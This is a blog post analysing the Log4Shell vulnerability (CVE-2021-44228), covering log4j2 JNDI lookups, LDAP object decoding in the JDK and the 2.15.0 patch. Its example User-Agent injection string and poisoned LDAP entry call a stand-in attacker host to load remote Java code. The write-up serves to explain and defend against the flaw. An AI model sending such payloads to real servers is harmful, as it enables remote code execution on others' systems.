---
id: 6
title: Log4Shell
date: 2021-12-14
preview: |
  A deep dive into the zero-day vulnerability "Log4Shell"
section: dev
tags:
  - security
draft: false
---

[TOC]

On 2021 November 26th, the Apache Log4j2 vulnerability dubbed "Log4Shell" was recorded on the CVE Database under [`CVE-2021-44228`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)[^nv1].

{{< blockquote name="nvd.nist.gov" link="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">}}
Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints...
{{< /blockquote >}}

It received mainstream news attention, partly due to its impact to popular services such as the game Minecraft, but primarily due to how widespread the vulnerability is and the ease in which attacks can be delivered.

It has been given the highest NVD base score: **`10.0 CRITICAL`**.

## How Log4j2 is Vulnerable

The log4j2 logging library provides **lookups**[^ap1] to add values to the log4j configuration and logs at arbitrary places. For example, `${java:version}` will be resolved to the current running version of Java.

**JNDI Lookup plugin support** was added to this functionality on 19th July 2013 in [commit `f1a0cac`](https://github.com/apache/logging-log4j2/commit/f1a0cac60f1e41347c9bced7c1470be488840344) releasing with [version 2.0-beta9, under issue LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313).

This allowed Log4j to use JNDI providers such as DNS, LDAP, RMI, etc. to retrieve variables and substitute them into the logs that it produces.

`CVE-2021-44228` was discovered through vulnerable JNDI providers such as -- *and in particular* -- LDAP, where these log4j2 JNDI lookups made remote calls to arbitrary (malicious) servers, fetching unverified objects that would then be deserialised, loaded and executed on the vulnerable servers.

These RCE vulnerabilities in the LDAP, RMI and COBRA JNDI providers were previously presented at [Black Hat 2016 by Alvaro Muñoz & Oleksandr Mirosh](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)[^mu1]. However, the novel application to this using log4j logging interpolation was only discovered in this latest CVE.

### The User-Agent attack vector

The most commonly reported attack vector for this vulnerability is with the `User-Agent` HTTP header.

1. An attacker sends an HTTP request with a modified `User-Agent: ${jndi:ldap://evil.xa/x}` header to a vulnerable web-server
2. The vulnerable web-server logs the HTTP request using log4j2
3. Log4j2 does a lookup using the LDAP JNDI provider, which will then make a remote LDAP query to the attacker's specified malicious server `ldap://evil.xa/x`
4. The malicious server sends back a response with a malicious Java object
5. The Java object is deserialised and executed on the vulnerable web-server and becomes a victim to the Attacker's RCE (Remote Code Execution)

{{<figr
    src="/blog/deep-dive-log4shell/log4j-attack-useragent.png"
    title="Example Log4Shell attack using the User-Agent header"
    attr="(from Swiss Government Computer Emergency Response Team)"
    attrlink="hhttps://govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j"
>}}

Here we can see why the Log4Shell vulnerability is given the `10.0 CRITICAL` score:

- Logging inbound HTTP requests with the ubiquitous [User-Agent header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) is a very common practice
- Most Java applications will be using some version of Log4j
- Modifying the `User-Agent` header is incredibly simple
- RCE allows the attacker to execute any Java code on the server

This is just one attack vector; the necessity of logging means that this vulnerability will have a massive attack surface.

## The technicalities

Now, lets take a deeper look into the source to understand how this all happens.

First, a brief tutorial on JNDI...

### Understanding JNDI

JNDI (**Java Naming and Directory Interface**) defines a common interface to interact with naming and directory services.

- **Naming Service**: Associates names with values (called *bindings*)
- **Directory Service**: Special type of naming service that allows storing and finding "directory objects"

It allows distributed applications to look up services in an abstract, resource-independent manner using the common JNDI interface. That is, **a variety of naming/directory services can be accessed by a Java application in a common way without the developers having to individually design code to access them.**

A core component of JNDI are *contexts* -- collections of name-to-object bindings. Once an application has a JNDI context, it can create name-to-object bindings with the `.bind()` method, and later retrieve the objects with the `.lookup(name)` methods[^jb1].

JNDI Providers (such as DNS, LDAP, RMI, etc...) can provide their own implementation of a *context* factory through JNDI's "*pluggable*" Service Provider Interface (SPI) to provide their own naming or directory service. These individual/plugged services are then managed by JNDI through the Naming Manager.

This architecture can be seen in the diagram below:

{{<figr
    src="/blog/deep-dive-log4shell/jndi-arch.jpg"
    title="JNDI Architecture"
    attr="(from docs.oracle.com/)"
    attrlink="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html"
>}}

In detail, JNDI's entry point for creating a context is with the `javax.naming.InitialContext` class[^ja1]. This, provided with a hashmap environment, will then load the factories of a JNDI provider context (such as LDAP). A short code sample of this is shown below[^ja2]:

``` java
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;

Hashtable env =  new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, "ldap://remotehost/o=JNDITutorial");

DirContext ctx = new InitialDirContext(env);

ctx.bind("foo", "Sample String");

Object result = ctx.lookup("foo");
```

Some example JNDI factory classes[^fa1]:

| Service    | Factory                                                                                   |
|------------|-------------------------------------------------------------------------------------------|
| Filesystem | `com.sun.jndi.fscontext.FSContextFactory` or `com.sun.jndi.fscontext.RefFSContextFactory` |
| LDAPv3     | `com.sun.jndi.ldap.LdapCtxFactory`                                                        |
| RMI        | `com.sun.jndi.rmi.registry.RegistryContextFactory`                                        |

Once the Context is produced from the factory class, the simple JNDI API allows us to lookup an object. If this object is an instance of `javax.naming.Reference`, JNDI will try to resolve the `"classFactory"` and `"classFactoryLocation"` attributes of this object. If the former `"classFactory"` is not on the immediate class path of the Java application, it will use the `"classFactoryLocation"` with Java's `URLClassLoader`[^ve1].

### LDAP and Decoding Objects

The `com.sun.jndi.ldap.LdapCtx`[^op1] context class will decode an object if the server's answer has valid LDAP attributes associated to them.

We can see this in the [`c_lookup` method @ L1050-L1052:](https://github.com/openjdk-mirror/jdk7u-jdk/blob/master/src/share/classes/com/sun/jndi/ldap/LdapCtx.java#L1050-L1052)


``` java
// Pseudo abbrev. method
protected Object c_lookup(Name name, Continuation cont) {

    // Do search on connection handle to LDAP server
    LdapResult answer = doSearchOnce(name, "(objectClass=*)", cons, true);

    // Check for attributes in the Answer
    if (answer.entries == null || answer.entries.size() != 1) {
        // found it but got no attributes
        attrs = new BasicAttributes(LdapClient.caseIgnore);
    } else {
        LdapEntry entry = (LdapEntry)answer.entries.elementAt(0);
        attrs = entry.attributes;
    }

    if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) {
        // serialized object or object reference
        obj = Obj.decodeObject(attrs);
    }
}
```

This makes a call to the [`com.sun.jndi.ldap.Obj.decodeObject method`](https://github.com/openjdk-mirror/jdk7u-jdk/blob/master/src/share/classes/com/sun/jndi/ldap/Obj.java#L221-L228):

``` java
/*
* Decode an object from LDAP attribute(s).
* The object may be a Reference, or a Serialized object.
*
* See encodeObject() and encodeReference() for details on formats
* expected.
*/
static Object decodeObject(Attributes attrs);
```

Where the [`com.sun.jndi.ldap.Obj.JAVA_ATTRIBUTES`](https://github.com/openjdk-mirror/jdk7u-jdk/blob/master/src/share/classes/com/sun/jndi/ldap/Obj.java#L65-L75) constant defines the expected Attribute keys to use on serialisation/deserialisation:

``` java
// LDAP attributes used to support Java objects.
static final String[] JAVA_ATTRIBUTES = {
    "objectClass",
    "javaSerializedData",
    "javaClassName",
    "javaFactory",
    "javaCodeBase",
    "javaReferenceAddress",
    "javaClassNames",
    "javaRemoteLocation"     // Deprecated
};
```

An attacker can then provide a Poisoned LDAP entry by placing the `javaSerializedData` attribute:

``` ldap
ObjectClass: inetOrgPerson
UID: someGuy
Name: Some Guy
Email Address: someGuy@someCompany.org
Location: Somewhere, SW
javaSerializedData: 94E2375DC52E94EBA42C4CB7F5492377...
javaCodebase: http://attacker-server/
javaClassName: DeserializationPayload
```

### Log4j's usage of JNDI

in log4j2 release tagged `rel/2.14.1`[^ap2] (last affected version), you can see the JNDI Manager making a direct lookup via `javax.naming.Context.lookup` at [apache/logging-log4j2@be881e503e JndiManager.java L170-L173](https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L170-L173)

``` java
import javax.naming.Context;
import javax.naming.NamingException;

public class JndiManager extends AbstractManager {

    private final Context context;

    @SuppressWarnings("unchecked")
    public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
    }

}
```

The patched version, `rel/2.15.0`, attempts to mitigate this with [pull #608](https://github.com/apache/logging-log4j2/pull/608) by introducing extensive input validation prior to this lookup.

For example, a simple check taken from a snippet of the new method:

``` java
public synchronized <T> T lookup(final String name) throws NamingException {
    try {
        URI uri = new URI(name);
        if (uri.getScheme() != null) {
            if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
                if (!allowedHosts.contains(uri.getHost())) {
                    LOGGER.warn("Attempt to access ldap server not in allowed list");
                    return null;
                }
            }
        }
    }

    // ...

    return (T) this.context.lookup(name);
}
```

## References
<!-- References -->

{{% citation
    ref="nv1"
    type="Webpage"
    year="2021"
    author="National Vulnerability Database (NVD)"
    title="CVE-2021-44228 Detail"
    url="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
%}}

{{% citation
    ref="ap1"
    type="Webpage"
    year="2021"
    author="Apache Log4j"
    title="Lookups"
    url="https://logging.apache.org/log4j/2.x/manual/lookups.html"
%}}

{{% citation
    ref="op1"
    type="Codebase"
    year="n.d."
    author="openjdk-mirror"
    title="jdk7u-jdk"
    subtitle="com.sun.jndi.ldap"
    url="https://github.com/openjdk-mirror/jdk7u-jdk/tree/f4d80957e89a19a29bb9f9807d2a28351ed7f7df/src/share/classes/com/sun/jndi/ldap"
%}}

{{% citation
    ref="mu1"
    type="Report"
    year="2016"
    author="A. Muñoz & O. Mirosh"
    title="A Journey from JNDI/LDAP Manipulation to Remote Code Execution Dream Land"
    subtitle="Black Hat USA 2016"
    url="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"
%}}

{{% citation
    ref="ja1"
    type="Webpage"
    year="n.d."
    author="Oracle"
    title="Implementing an Initial Context Factory"
    subtitle="The Essential Components"
    url="https://docs.oracle.com/javase/jndi/tutorial/provider/basics/initial.html"
%}}

{{% citation
    ref="ja2"
    type="Webpage"
    year="n.d."
    author="Oracle"
    title="LDAP Authentication"
    subtitle="Security"
    url="https://docs.oracle.com/javase/jndi/tutorial/ldap/security/ldap.html"
%}}

{{% citation
    ref="ve1"
    type="Webpage"
    year="2019"
    author="M. Stepankin"
    title="Exploiting JNDI injections in Java"
    subtitle="Veracode"
    url="https://www.veracode.com/blog/research/exploiting-jndi-injections-java"
%}}

{{% citation
    ref="jb1"
    type="Webpage"
    year="n.d."
    author="Redhat"
    title="Chapter 9. The JNDI Naming Service"
    subtitle="JBoss Enterprise Application Platform"
    url="https://access.redhat.com/documentation/en-us/jboss_enterprise_application_platform/5/html/administration_and_configuration_guide/naming_on_jboss"
%}}

{{% citation
    ref="ap2"
    type="Codebase"
    year="n.d."
    author="Apache"
    title="logging-log4j2"
    url="https://github.com/apache/logging-log4j2"
%}}

{{% citation
    ref="fa1"
    type="Book"
    year="2001"
    author="J. Farley, W. Crawford, et.al"
    title="Java Enterprise in a Nutshell"
    subtitle="Chapter 6. JNDI"
    url="https://docstore.mik.ua/orelly/java-ent/jenut/ch06_03.htm"
%}}